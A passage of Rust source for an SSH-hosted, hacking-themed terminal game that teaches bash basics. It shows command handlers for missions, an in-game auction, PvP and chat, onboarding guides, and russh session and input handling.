                let mut out = self.render_section_banner("MISSION BOARD");
                out.push_str("CODE             STATE      PROG                 TRACK      TITLE\n");
                for m in missions {
                    let badge = mission_state_badge(self.mode.clone(), &m.state);
                    let meter = progress_meter(self.mode.clone(), m.progress, 12);
                    let track = mission_track_label(m.required, m.starter);
                    out.push_str(&format!(
                        "{:<16} {:<10} {:>3}% {} {:<10} {}\n",
                        m.code,
                        badge,
                        m.progress.min(100),
                        meter,
                        track,
                        m.title
                    ));
                    out.push_str(&format!("  Brief: {}\n", m.summary));
                    out.push_str(&format!("  Try  : {}\n", m.suggested_command));
                }
                out.push_str("\nUse `briefing <mission-code>` for deeper story and shell hints.\n");
                Ok((out, 0, false))
            }
            "accept" => {
                let Some(code) = args.first() else {
                    return Ok(("Usage: accept <mission-code>\n".to_owned(), 1, false));
                };
                self.app.world.accept_mission(player_id, code).await?;
                Ok((format!("Mission accepted: {code}\n"), 0, false))
            }
            "submit" => {
                let Some(code) = args.first() else {
                    return Ok(("Usage: submit <mission-code>\n".to_owned(), 1, false));
                };
                // Validate mission completion by checking command output log
                if let Some(shell) = &self.shell_state {
                    if let Err(e) = self
                        .app
                        .world
                        .validate_mission(code, &shell.command_log)
                        .await
                    {
                        return Ok((format!("{e}\n"), 1, false));
                    }
                }
                self.app.world.complete_mission(player_id, code).await?;
                let mut out = format!("Mission completed: {code}\n");
                if *code == "keys-vault" {
                    out.push_str(
                        "KEYS VAULT complete. Finish one starter mission for NetCity unlock.\n",
                    );
                }
                if self.app.world.is_hidden_mission_code(code) {
                    out.push_str("Secret relay unlocked. Use: relay <message>\n");
                }
                Ok((out, 0, false))
            }
            "inventory" => Ok((
                "Inventory: [script.gremlin.grep x1], [focus_boost x2]\n".to_owned(),
                0,
                false,
            )),
            "shop" => {
                if args.first() == Some(&"list") {
                    Ok((
                        "shop.catalog\n- script.gremlin.grep : 150 Neon Chips\n- script.pipe.chain : 230 Neon Chips\n- consumable.focus_boost : 90 Neon Chips\n"
                            .to_owned(),
                        0,
                        false,
                    ))
                } else if args.first() == Some(&"buy") {
                    if let Some(sku) = args.get(1) {
                        Ok((format!("Purchased {sku}.\n"), 0, false))
                    } else {
                        Ok(("Usage: shop buy <sku>\n".to_owned(), 1, false))
                    }
                } else {
                    Ok(("Usage: shop list | shop buy <sku>\n".to_owned(), 1, false))
                }
            }
            "auction" => {
                if args.first() == Some(&"list") {
                    let listings = self.app.world.market_snapshot().await;
                    if listings.is_empty() {
                        return Ok(("No active auction listings.\n".to_owned(), 0, false));
                    }

                    let now = chrono::Utc::now();
                    let mut out = String::from(
                        "ID                                   ITEM                  QTY  BID/FLOOR      BUYOUT  ETA   SELLER\n",
                    );
                    for item in listings {
                        let bid = item.highest_bid.unwrap_or(item.start_price);
                        let eta_mins = (item.expires_at - now).num_minutes().max(0);
                        let buyout = item
                            .buyout_price
                            .map(|v| v.to_string())
                            .unwrap_or_else(|| "-".to_owned());
                        out.push_str(&format!(
                            "{} {:<20} {:<4} {:<14} {:<7} {:<5} {}\n",
                            item.listing_id,
                            item.item_sku,
                            item.qty,
                            format!("{bid}/{}", item.start_price),
                            buyout,
                            format!("{eta_mins}m"),
                            item.seller_display
                        ));
                    }
                    Ok((out, 0, false))
                } else if args.first() == Some(&"sell") {
                    if args.len() < 4 {
                        return Ok((
                            "Usage: auction sell <sku> <qty> <start_price> [buyout]\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                    let qty = args[2].parse::<u32>().unwrap_or(1);
                    let start = args[3].parse::<i64>().unwrap_or(25);
                    let buyout = args.get(4).and_then(|v| v.parse::<i64>().ok());
                    let listing = self
                        .app
                        .world
                        .create_listing(player_id, args[1], qty, start, buyout)
                        .await?;
                    Ok((
                        format!("Listing created: {}\n", listing.listing_id),
                        0,
                        false,
                    ))
                } else if args.first() == Some(&"bid") {
                    if args.len() != 3 {
                        return Ok((
                            "Usage: auction bid <listing_id> <amount>\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                    let id = Uuid::parse_str(args[1]).context("invalid listing id")?;
                    let amount = args[2].parse::<i64>().context("invalid amount")?;
                    self.app.world.place_bid(player_id, id, amount).await?;
                    Ok(("Bid placed.\n".to_owned(), 0, false))
                } else if args.first() == Some(&"buyout") {
                    if args.len() != 2 {
                        return Ok(("Usage: auction buyout <listing_id>\n".to_owned(), 1, false));
                    }
                    let id = Uuid::parse_str(args[1]).context("invalid listing id")?;
                    self.app.world.buyout(player_id, id).await?;
                    Ok(("Buyout completed.\n".to_owned(), 0, false))
                } else {
                    Ok(("Usage: auction list|sell|bid|buyout\n".to_owned(), 1, false))
                }
            }
            "chat" => {
                if args.len() < 2 {
                    return Ok((
                        "Usage: chat <global|sector|party> <message>\n".to_owned(),
                        1,
                        false,
                    ));
                }
                let channel = args[0];
                let msg = line.splitn(3, ' ').nth(2).unwrap_or_default();
                let chat = self.app.world.post_chat(player_id, channel, msg).await?;
                Ok((
                    format!(
                        "[{}] {}: {}\n",
                        chat.channel, chat.sender_display, chat.body
                    ),
                    0,
                    false,
                ))
            }
            "mail" => Ok((
                "mail subsystem ready: mail inbox | mail send <player> <text>\n".to_owned(),
                0,
                false,
            )),
            "party" => Ok((
                "party subsystem ready: party invite|join|leave\n".to_owned(),
                0,
                false,
            )),
            "mode" => {
                if args.is_empty() {
                    return Ok((
                        "Usage: mode <training|netcity|redline> [--no-flash]\n".to_owned(),
                        1,
                        false,
                    ));
                }
                let target = match args[0] {
                    "training" => Mode::Training,
                    "netcity" => Mode::NetCity,
                    "redline" => Mode::Redline,
                    _ => {
                        return Ok((
                            "Unknown mode. Use training|netcity|redline\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                };

                let no_flash = args.contains(&"--no-flash");
                let old = self.mode.clone();
                self.flash_enabled = if no_flash { false } else { self.flash_enabled };

                if let Err(err) = self
                    .app
                    .world
                    .mode_switch(player_id, target.clone(), Some(self.flash_enabled))
                    .await
                {
                    return Ok((format!("{err}\n"), 1, false));
                }

                if target == Mode::Redline {
                    self.redline_until = Some(
                        Instant::now() + Duration::from_secs(self.app.cfg.redline.duration_seconds),
                    );
                } else {
                    self.redline_until = None;
                }

                self.mode = target.clone();
                let mut out = String::new();
                out.push_str(&mode_switch_banner(old, target.clone()));
                out.push_str(&self.render_mode_banner(target.clone()));
                out.push('\n');
                out.push_str(lore_message(target));
                out.push('\n');
                Ok((out, 0, false))
            }
            "keyvault" => {
                if args.first() == Some(&"register") {
                    let maybe_line = line.strip_prefix("keyvault register").unwrap_or("").trim();
                    if maybe_line.is_empty() {
                        self.pending_keyvault = true;
                        return Ok((
                            "Paste your full public key line now (ssh-ed25519 AAAA... comment):\n"
                                .to_owned(),
                            0,
                            false,
                        ));
                    }
                    match self.app.world.register_key(player_id, maybe_line).await {
                        Ok(fp) => Ok((format!("Key registered: {fp}\n"), 0, false)),
                        Err(err) => Ok((format!("Key registration failed: {err}\n"), 1, false)),
                    }
                } else {
                    Ok((
                        "Usage: keyvault register [ssh-public-key-line]\n".to_owned(),
                        1,
                        false,
                    ))
                }
            }
            "settings" => {
                if args.len() == 2 && args[0] == "flash" {
                    self.flash_enabled = args[1] != "off";
                    Ok((
                        format!(
                            "Flash effects {}\n",
                            if self.flash_enabled { "ON" } else { "OFF" }
                        ),
                        0,
                        false,
                    ))
                } else {
                    Ok(("Usage: settings flash <on|off>\n".to_owned(), 1, false))
                }
            }
            "status" => {
                let player = self
                    .app
                    .world
                    .get_player(player_id)
                    .await
                    .ok_or_else(|| anyhow!("unknown player"))?;
                let gate = self
                    .app
                    .world
                    .netcity_gate_reason(player_id, &self.offered_fingerprints)
                    .await?;
                let mut achievements = player.achievements.iter().cloned().collect::<Vec<_>>();
                achievements.sort();
                let ach = if achievements.is_empty() {
                    "none".to_owned()
                } else {
                    achievements.join(", ")
                };
                let gate_status = gate.clone().unwrap_or_else(|| "UNLOCKED".to_owned());
                let streak = player
                    .streak_day
                    .map(|d| d.to_string())
                    .unwrap_or("-".to_owned());
                let rep_pct = player.reputation.clamp(0, 100) as u8;
                let death_pct = if player.deaths >= 3 {
                    0
                } else {
                    (((3 - player.deaths) as f32 / 3.0) * 100.0).round() as u8
                };
                let gate_pct = if gate.is_none() { 100 } else { 20 };

                let mut out = self.render_section_banner("PLAYER STATUS");
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Alias",
                    &player.private_alias,
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Display",
                    &player.display_name,
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Tier/Mode",
                    &format!("{:?} / {:?}", player.tier, player.mode),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Wallet",
                    &format!("{} Neon Chips", player.wallet),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Reputation",
                    &format!(
                        "{} {}",
                        player.reputation,
                        progress_meter(self.mode.clone(), rep_pct, 14)
                    ),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Survival",
                    &format!(
                        "{} deaths {}",
                        player.deaths,
                        progress_meter(self.mode.clone(), death_pct, 14)
                    ),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "NetCity Gate",
                    &format!(
                        "{} {}",
                        gate_status,
                        progress_meter(self.mode.clone(), gate_pct, 14)
                    ),
                ));
                out.push_str(&key_value_line(
                    self.mode.clone(),
                    "Daily Streak",
                    &format!("{} (last claim: {})", player.streak, streak),
                ));
                out.push_str(&key_value_line(self.mode.clone(), "Achievements", &ach));

                Ok((out, 0, false))
            }
            "events" => {
                let feed = self
                    .app
                    .world
                    .world_events_snapshot(chrono::Utc::now())
                    .await;
                if feed.is_empty() {
                    return Ok(("No upcoming world events.\n".to_owned(), 0, false));
                }
                let now = chrono::Utc::now();
                let mut out = self.render_section_banner("WORLD EVENTS");
                for event in feed {
                    let status = if event.active {
                        format!(
                            "ACTIVE (ends in {}m)",
                            (event.ends_at - now).num_minutes().max(0)
                        )
                    } else {
                        format!(
                            "UPCOMING (starts in {}m)",
                            (event.starts_at - now).num_minutes().max(0)
                        )
                    };
                    out.push_str(&format!(
                        "- {} :: {} :: {}\n",
                        event.sector, event.title, status
                    ));
                }
                Ok((out, 0, false))
            }
            "scripts" => {
                if args.first() == Some(&"market") || args.is_empty() {
                    let mut out = self.render_section_banner("SCRIPT MARKET");
                    for entry in script_market() {
                        out.push_str(&format!(
                            "- {:<12} {}{}\n",
                            entry.name, entry.description, RESET
                        ));
                    }
                    out.push_str("Run with: scripts run <name>\n");
                    return Ok((out, 0, false));
                }

                if args.first() != Some(&"run") {
                    return Ok((
                        "Usage: scripts market | scripts run <name>\n".to_owned(),
                        1,
                        false,
                    ));
                }

                let Some(name) = args.get(1).copied() else {
                    return Ok(("Usage: scripts run <name>\n".to_owned(), 1, false));
                };
                let Some(entry) = script_market().iter().find(|entry| entry.name == name) else {
                    let names = script_market()
                        .iter()
                        .map(|entry| entry.name)
                        .collect::<Vec<_>>()
                        .join(", ");
                    return Ok((format!("Unknown script. Available: {names}\n"), 1, false));
                };

                if let Some(until) = self.script_cooldown_until {
                    let now = Instant::now();
                    if now < until {
                        let remain = until.duration_since(now).as_secs().max(1);
                        return Ok((
                            format!("Script sandbox cooling down. Retry in {remain}s\n"),
                            1,
                            false,
                        ));
                    }
                }

                let log_content = self
                    .shell_state
                    .as_ref()
                    .and_then(|shell| {
                        shell
                            .vfs
                            .read_file(&shell.cwd, "/logs/neon-gateway.log")
                            .ok()
                    })
                    .unwrap_or_default();
                let mut virtual_files = BTreeMap::new();
                virtual_files.insert("/logs/neon-gateway.log".to_owned(), log_content);
                let script_out = self
                    .app
                    .script
                    .run(
                        entry.source,
                        ScriptContext {
                            visible_nodes: vec![
                                "neon-bazaar-gw".to_owned(),
                                "ghost-rail".to_owned(),
                                "vault-sat-9".to_owned(),
                            ],
                            virtual_files,
                        },
                    )
                    .await
                    .map_err(|e| anyhow!("script execution failed: {e}"))?;

                self.script_cooldown_until = Some(Instant::now() + Duration::from_secs(8));
                let mut out = format!("Script {} complete.\n", entry.name);
                if script_out.output.trim().is_empty() {
                    out.push_str("(no output)\n");
                } else {
                    out.push_str(&script_out.output);
                    if !out.ends_with('\n') {
                        out.push('\n');
                    }
                }
                Ok((out, 0, false))
            }
            "daily" => {
                let reward = self
                    .app
                    .world
                    .claim_daily_reward(player_id, chrono::Utc::now())
                    .await?;
                Ok((format!("Daily reward: +{reward} Neon Chips\n"), 0, false))
            }
            "tier" => {
                let Some(raw) = args.first() else {
                    return Ok(("Usage: tier <noob|gud|hardcore>\n".to_owned(), 1, false));
                };
                let Some(tier) = ExperienceTier::parse(raw) else {
                    return Ok((
                        "Invalid tier. Use: noob, gud, hardcore\n".to_owned(),
                        1,
                        false,
                    ));
                };
                self.app.world.set_tier(player_id, tier).await?;
                Ok((
                    "Tier set. Available tiers: Noob, Gud, Hardcore\n".to_owned(),
                    0,
                    false,
                ))
            }
            "pvp" => {
                if args.is_empty() {
                    return Ok((
                        "Usage: pvp roster | pvp challenge <username> | pvp attack|defend|script <name>\n"
                            .to_owned(),
                        1,
                        false,
                    ));
                }
                match args[0] {
                    "roster" => {
                        let roster = self.app.world.roster().await;
                        Ok((format!("{}\n", roster.join("\n")), 0, false))
                    }
                    "challenge" => {
                        let Some(target_name) = args.get(1) else {
                            return Ok(("Usage: pvp challenge <username>\n".to_owned(), 1, false));
                        };
                        let Some(target) =
                            self.app.world.resolve_player_by_username(target_name).await
                        else {
                            return Ok(("Target not found\n".to_owned(), 1, false));
                        };
                        let duel = self.app.world.start_duel(player_id, target.id).await?;
                        self.current_duel = Some(duel.duel_id);
                        Ok((
                            format!("Duel started vs {}\n", target.display_name),
                            0,
                            false,
                        ))
                    }
                    "attack" | "defend" | "script" => {
                        let Some(duel_id) = self.current_duel else {
                            return Ok((
                                "No active duel. Start with: pvp challenge <username>\n".to_owned(),
                                1,
                                false,
                            ));
                        };
                        let action = match args[0] {
                            "attack" => CombatAction::Attack,
                            "defend" => CombatAction::Defend,
                            "script" => {
                                let name = args.get(1).copied().unwrap_or("quickhack").to_owned();
                                CombatAction::Script(name)
                            }
                            _ => unreachable!(),
                        };
                        let outcome = self
                            .app
                            .world
                            .duel_action(duel_id, player_id, action)
                            .await?;
                        if outcome.ended {
                            self.current_duel = None;
                        }
                        Ok((format!("{}\n", outcome.narrative), 0, false))
                    }
                    _ => Ok(("Unknown pvp command\n".to_owned(), 1, false)),
                }
            }
            "relay" => {
                let body = line.strip_prefix("relay").unwrap_or("").trim();
                if body.is_empty() {
                    return Ok(("Usage: relay <message>\n".to_owned(), 1, false));
                }
                if !self
                    .app
                    .world
                    .player_has_completed_hidden_mission(player_id)
                    .await
                {
                    return Ok((
                        "Relay locked. Discover deeper city layers first.\n".to_owned(),
                        1,
                        false,
                    ));
                }
                self.app
                    .world
                    .relay_to_admin_via_telegram(player_id, body)
                    .await?;
                Ok((
                    "Message relayed via secure bot channel.\n".to_owned(),
                    0,
                    false,
                ))
            }
            _ => Ok((
                "Unknown game command. Run help or guide.\n".to_owned(),
                127,
                false,
            )),
        }
    }

    fn quickstart_guide(&self) -> String {
        let mut out = self.render_section_banner("FIRST SESSION PLAYBOOK");
        out.push_str("1. tutorial start\n");
        out.push_str("2. guide shell          (or cat /missions/rookie-ops.txt)\n");
        out.push_str("3. briefing\n");
        out.push_str("4. missions\n");
        out.push_str("5. accept keys-vault\n");
        out.push_str("6. keyvault register\n");
        out.push_str("7. submit keys-vault\n");
        out.push_str("8. briefing pipes-101   (or log-hunt|dedupe-city)\n");
        out.push_str("9. accept pipes-101     (or the starter mission you want)\n");
        out.push_str("10. submit pipes-101    (or the starter mission you accepted)\n");
        out.push_str("11. gate\n");
        out.push_str("12. mode netcity\n");
        out.push('\n');
        out.push_str("If bash feels rusty\n");
        out.push_str("  cat /missions/rookie-ops.txt\n");
        out.push_str("  cat /data/lore/field-manual.txt\n");
        out.push('\n');
        out.push_str("Daily loop after unlock\n");
        out.push_str(
            "  daily -> events -> auction list -> scripts market -> pvp roster -> leaderboard\n",
        );
        out.push('\n');
        out.push_str("Use `guide full` for a deeper walkthrough of progression systems.\n");
        out
    }

    fn full_gameplay_guide(&self) -> String {
        let mut out = self.render_section_banner("GAMEPLAY GUIDE // FULL");
        out.push_str("Onboarding and unlock flow\n");
        out.push_str("  - Start tutorial: tutorial start\n");
        out.push_str("  - Get shell basics: guide shell\n");
        out.push_str("  - Read story + hints: briefing\n");
        out.push_str("  - Read shell cheat sheet: cat /missions/rookie-ops.txt\n");
        out.push_str("  - Inspect board: missions\n");
        out.push_str("  - Accept required: accept keys-vault\n");
        out.push_str("  - Register key: keyvault register\n");
        out.push_str("  - Complete mission: submit keys-vault\n");
        out.push_str(
            "  - Complete one starter mission: pipes-101|finder|redirect-lab|log-hunt|dedupe-city\n",
        );
        out.push_str("  - Get mission-specific help: briefing <mission-code>\n");
        out.push_str("  - Verify requirements: gate\n");
        out.push_str("  - Enter multiplayer: mode netcity\n");
        out.push('\n');
        out.push_str("Bash ramp for new players\n");
        out.push_str("  - Read files with cat, head, tail, or less\n");
        out.push_str("  - Use grep to filter lines by a word or pattern\n");
        out.push_str("  - Use | to pass output to the next command\n");
        out.push_str("  - Use > to save output, and >> to append to a file\n");
        out.push_str("  - If a pipeline feels too long, run each step separately first\n");
        out.push('\n');
        out.push_str("Advanced missions (post-NetCity)\n");
        out.push_str("  - awk-patrol  : Extract fields from /data/node-registry.csv with awk\n");
        out.push_str("  - chain-ops   : Use && and || to chain conditional commands\n");
        out.push_str("  - sediment    : Edit /logs/access.log streams with sed\n");
        out.push_str("  Each awards 20 reputation (vs 10 for starters).\n");
        out.push('\n');
        out.push_str("Story frame\n");
        out.push_str("  - Ghost Rail suffered the first blackout.\n");
        out.push_str("  - vault-sat-9 dropped offline right after GLASS-AXON-13 surfaced.\n");
        out.push_str("  - CorpSim is training replacements while the city argues about sabotage vs key theft.\n");
        out.push('\n');
        out.push_str("Progression systems\n");
        out.push_str("  - Status and progression: status, missions, gate, events\n");
        out.push_str("  - Economy: shop list, auction list|sell|bid|buyout\n");
        out.push_str("  - Scripts: scripts market, scripts run <name>\n");
        out.push_str("  - PvP: pvp roster, pvp challenge <user>, pvp attack|defend|script\n");
        out.push_str("  - Daily value: daily, leaderboard [N]\n");
        out.push('\n');
        out.push_str("Difficulty and risk\n");
        out.push_str("  - Set tier: tier noob|gud|hardcore\n");
        out.push_str("  - Hardcore rule: 3 deaths permanently zeroes account\n");
        out.push_str("  - REDLINE mode: mode redline    (disable flash with settings flash off)\n");
        out.push('\n');
        out.push_str("Security rule\n");
        out.push_str("  - Any breakout/probing attempt triggers permanent zero + disconnect.\n");
        out
    }

    fn shell_survival_guide(&self) -> String {
        let mut out = self.render_section_banner("SHELL SURVIVAL GUIDE");
        out.push_str("Read-only first steps\n");
        out.push_str("  - pwd                      # show your current path\n");
        out.push_str("  - ls /logs                 # inspect files before opening them\n");
        out.push_str("  - cat /missions/story-so-far.txt\n");
        out.push('\n');
        out.push_str("Filter and count\n");
        out.push_str("  - grep token /logs/neon-gateway.log\n");
        out.push_str("  - cat /logs/neon-gateway.log | grep token | wc -l\n");
        out.push('\n');
        out.push_str("Save output for later\n");
        out.push_str("  - grep WARN /logs/neon-gateway.log > /tmp/warnings.txt\n");
        out.push_str("  - cat /tmp/warnings.txt\n");
        out.push('\n');
        out.push_str("Reuse values\n");
        out.push_str("  - TARGET=vault-sat-9\n");
        out.push_str("  - echo $TARGET\n");
        out.push_str("  - echo $?                  # last exit code, 0 means success\n");
        out.push('\n');
        out.push_str("When you get stuck\n");
        out.push_str("  - Run one command at a time before building a pipeline.\n");
        out.push_str("  - Read /missions/rookie-ops.txt and /data/lore/field-manual.txt.\n");
        out.push_str(
            "  - Use briefing <mission-code> to get a mission-specific starter command.\n",
        );
        out
    }

    fn story_briefing(&self) -> String {
        let mut out = self.render_section_banner("OPERATIVE BRIEFING");
        out.push_str("Situation\n");
        out.push_str(
            "  Ghost Rail lost sync three nights ago. Since then, vault-sat-9 has stayed dark and a beacon named GLASS-AXON-13 keeps showing up in gateway logs.\n",
        );
        out.push_str(
            "  CorpSim calls this onboarding, but every mission file in this sim is built from live cleanup traffic.\n",
        );
        out.push('\n');
        out.push_str("First moves\n");
        out.push_str("  - tutorial start\n");
        out.push_str("  - guide shell\n");
        out.push_str("  - cat /missions/rookie-ops.txt\n");
        out.push_str("  - missions\n");
        out.push_str("  - briefing pipes-101\n");
        out.push_str("  - accept keys-vault\n");
        out.push('\n');
        out.push_str("Story files\n");
        out.push_str("  - /missions/story-so-far.txt\n");
        out.push_str("  - /data/lore/ghost-rail-dossier.txt\n");
        out.push_str("  - /data/lore/netcity-fragment.txt\n");
        out.push('\n');
        out.push_str("Mission help\n");
        out.push_str("  Use: briefing <mission-code>\n");
        out.push_str("  Recommended starter order: pipes-101 -> log-hunt -> dedupe-city\n");
        out
    }

    fn render_mission_briefing(&self, mission: &world::MissionDefinition) -> String {
        let mut out = self.render_section_banner(&format!("MISSION BRIEF // {}", mission.code));
        out.push_str(&format!("{}\n", mission.title));
        out.push('\n');
        out.push_str("Why it matters\n");
        out.push_str(&format!("  {}\n", mission.story_beat));
        out.push('\n');
        out.push_str("What you practice\n");
        out.push_str(&format!("  {}\n", mission.summary));
        out.push('\n');
        out.push_str("First command to try\n");
        out.push_str(&format!("  {}\n", mission.suggested_command));
        out.push('\n');
        out.push_str("Hint\n");
        out.push_str(&format!("  {}\n", mission.hint));
        out
    }

    fn welcome_banner(&self) -> String {
        let theme = Theme::for_mode(self.mode.clone());
        let mut out = String::new();
        out.push_str(&self.render_mode_banner(self.mode.clone()));
        out.push('\n');
        out.push_str(lore_message(self.mode.clone()));
        out.push('\n');
        out.push_str(&self.render_section_banner("BOOT HUD"));
        out.push_str(&format!(
            "{}Next{} tutorial start -> briefing -> missions -> gate -> mode netcity\n",
            theme.accent, RESET
        ));
        out.push_str("Type `help` for the full command matrix.\n");
        out.push_str("Type `guide` for step-by-step onboarding and progression.\n");
        out.push_str("Type `guide shell` for bash fundamentals inside the sim.\n");
        out.push_str("Type `briefing` for the story so far and mission-specific hints.\n");
        out.push('\n');
        out.push_str(&self.quickstart_guide());
        out.push_str("Starter files: /missions/rookie-ops.txt, /missions/story-so-far.txt\n");
        out.push_str(
            "Host breakout/probing attempts trigger permanent account zero + disconnect.\n",
        );
        if self.pending_admin_passphrase {
            out.push_str(
                "Private admin bootstrap: enter passphrase to generate one-time key blob.\n",
            );
        }
        out
    }

    fn prompt(&self) -> String {
        self.shell_state
            .as_ref()
            .map(ShellState::prompt)
            .unwrap_or_else(|| "guest@boot:/$ ".to_owned())
    }

    fn render_mode_banner(&self, mode: Mode) -> String {
        if self.pty_columns > 0 && self.pty_columns < 36 {
            let theme = Theme::for_mode(mode.clone());
            return format!("{}[ {} ]{}", theme.primary, mode.as_label(), RESET);
        }
        mode_banner_adaptive(
            mode,
            self.flash_enabled,
            self.pty_columns.max(20) as usize,
            self.supports_unicode,
        )
    }

    fn render_section_banner(&self, title: &str) -> String {
        section_banner_adaptive(
            self.mode.clone(),
            title,
            self.pty_columns.max(20) as usize,
            self.supports_unicode,
        )
    }

    fn render_for_client(&self, text: &str) -> String {
        let raw = if self.supports_ansi {
            text.to_owned()
        } else {
            strip_ansi_sequences(text)
        };
        normalize_line_endings(&raw)
    }

    fn send_text(
        &self,
        session: &mut server::Session,
        channel: ChannelId,
        text: &str,
    ) -> Result<(), anyhow::Error> {
        session.data(channel, CryptoVec::from(self.render_for_client(text)))?;
        Ok(())
    }

    async fn submit_line(
        &mut self,
        session: &mut server::Session,
        channel: ChannelId,
    ) -> Result<bool, anyhow::Error> {
        if self.line_buffer.is_empty() {
            self.send_text(session, channel, "\n")?;
            self.send_text(session, channel, &self.prompt())?;
            return Ok(false);
        }

        let line = String::from_utf8_lossy(&self.line_buffer).to_string();
        self.line_buffer.clear();
        self.send_text(session, channel, "\n")?;

        let (out, code, should_close) = match self.run_line(&line).await {
            Ok(v) => v,
            Err(err) => (format!("{err}\n"), 1, false),
        };

        if !out.is_empty() {
            self.send_text(session, channel, &out)?;
        }
        session.exit_status_request(channel, code as u32)?;

        if should_close {
            session.eof(channel)?;
            session.close(channel)?;
            return Ok(true);
        }

        self.send_text(session, channel, &self.prompt())?;
        Ok(false)
    }
}

impl server::Server for GameServer {
    type Handler = GameSession;

    fn new_client(&mut self, peer_addr: Option<SocketAddr>) -> Self::Handler {
        GameSession::new(self.app.clone(), peer_addr)
    }

    fn handle_session_error(&mut self, error: <Self::Handler as server::Handler>::Error) {
        warn!("session error: {error:?}");
    }
}

impl server::Handler for GameSession {
    type Error = anyhow::Error;

    async fn auth_none(&mut self, user: &str) -> Result<server::Auth, Self::Error> {
        self.username = sanitize_prompt_user(user);
        Ok(server::Auth::Accept)
    }

    async fn auth_publickey_offered(
        &mut self,
        user: &str,
        public_key: &russh::keys::ssh_key::PublicKey,
    ) -> Result<server::Auth, Self::Error> {
        self.username = sanitize_prompt_user(user);
        let fp = sha256_hex(&format!("{public_key:?}"));
        self.offered_fingerprints.push(format!("SHA256:{fp}"));
        Ok(server::Auth::Accept)
    }

    async fn auth_publickey(
        &mut self,
        user: &str,
        _public_key: &russh::keys::ssh_key::PublicKey,
    ) -> Result<server::Auth, Self::Error> {
        self.username = sanitize_prompt_user(user);
        Ok(server::Auth::Accept)
    }

    async fn auth_succeeded(&mut self, _session: &mut server::Session) -> Result<(), Self::Error> {
        if let Err(err) = self.initialize_identity().await {
            error!("failed to init identity: {err:#}");
        }
        Ok(())
    }

    async fn channel_open_session(
        &mut self,
        _channel: Channel<Msg>,
        _session: &mut server::Session,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }

    async fn pty_request(
        &mut self,
        channel: ChannelId,
        term: &str,
        col_width: u32,
        _row_height: u32,
        _pix_width: u32,
        _pix_height: u32,
        _modes: &[(russh::Pty, u32)],
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        self.supports_ansi = terminal_supports_ansi(term);
        self.supports_unicode = terminal_supports_unicode(term);
        self.pty_columns = col_width.max(20);
        session.channel_success(channel)?;
        Ok(())
    }

    async fn env_request(
        &mut self,
        channel: ChannelId,
        variable_name: &str,
        variable_value: &str,
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        let var = variable_name.to_ascii_uppercase();
        if (var == "LANG" || var == "LC_ALL") && !locale_supports_unicode(variable_value) {
            self.supports_unicode = false;
        }
        session.channel_success(channel)?;
        Ok(())
    }

    async fn window_change_request(
        &mut self,
        channel: ChannelId,
        col_width: u32,
        _row_height: u32,
        _pix_width: u32,
        _pix_height: u32,
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        self.pty_columns = col_width.max(20);
        session.channel_success(channel)?;
        Ok(())
    }

    async fn shell_request(
        &mut self,
        channel: ChannelId,
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        session.channel_success(channel)?;
        self.send_text(session, channel, &self.welcome_banner())?;
        self.send_text(session, channel, &self.prompt())?;
        Ok(())
    }

    async fn exec_request(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        session.channel_success(channel)?;
        let line = String::from_utf8_lossy(data).trim().to_owned();
        let (out, code, _) = self
            .run_line(&line)
            .await
            .unwrap_or_else(|err| (format!("Execution error: {err}\n"), 1, false));
        self.send_text(session, channel, &out)?;
        session.exit_status_request(channel, code as u32)?;
        session.eof(channel)?;
        session.close(channel)?;
        Ok(())
    }

    async fn data(
        &mut self,
        channel: ChannelId,
        data: &[u8],
        session: &mut server::Session,
    ) -> Result<(), Self::Error> {
        for byte in data {
            match *byte {
                b'\r' => {
                    self.pending_lf_after_cr = true;
                    self.escape_sequence_remaining = 0;
                    if self.submit_line(session, channel).await? {
                        return Ok(());
                    }
                }
                b'\n' => {
                    if self.pending_lf_after_cr {
                        self.pending_lf_after_cr = false;
                        continue;
                    }
                    self.escape_sequence_remaining = 0;
                    if self.submit_line(session, channel).await? {
                        return Ok(());
                    }
                }
                3 => {
                    self.pending_lf_after_cr = false;
                    self.escape_sequence_remaining = 0;
                    self.line_buffer.clear();
                    self.send_text(session, channel, "^C\n")?;
                    self.send_text(session, channel, &self.prompt())?;
                }
                127 | 8 => {
                    self.pending_lf_after_cr = false;
                    self.escape_sequence_remaining = 0;
                    if !self.line_buffer.is_empty() {
                        self.line_buffer.pop();
                        session.data(channel, CryptoVec::from("\x08 \x08"))?;
                    }
                }
                0x1b => {
                    self.pending_lf_after_cr = false;
                    self.escape_sequence_remaining = 8;
                }
                b => {
                    self.pending_lf_after_cr = false;
                    if self.escape_sequence_remaining > 0 {
                        self.escape_sequence_remaining =
                            self.escape_sequence_remaining.saturating_sub(1);
                        if b.is_ascii_alphabetic() || b == b'~' {
                            self.escape_sequence_remaining = 0;
                        }
                        continue;
                    }
                    self.line_buffer.push(b);
                    session.data(channel, CryptoVec::from(vec![b]))?;
                }
            }
        }
        Ok(())
    }
}

fn sanitize_prompt_user(input: &str) -> String {
    let base = strip_ansi_sequences(input);
    let short = base.split('@').next().unwrap_or_default();
    let cleaned = short
        .chars()
        .take(24)
        .filter(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_' | '.'))
        .collect::<String>();
    if cleaned.is_empty() {
        "guest".to_owned()
    } else {
        cleaned
    }
}

fn terminal_supports_ansi(term: &str) -> bool {
    let t = term.trim().to_ascii_lowercase();
    !t.is_empty() && t != "dumb" && t != "cons25"
}

fn terminal_supports_unicode(term: &str) -> bool {
    let t = term.trim().to_ascii_lowercase();
    if t.is_empty() {
        return false;
    }
    !matches!(
        t.as_str(),
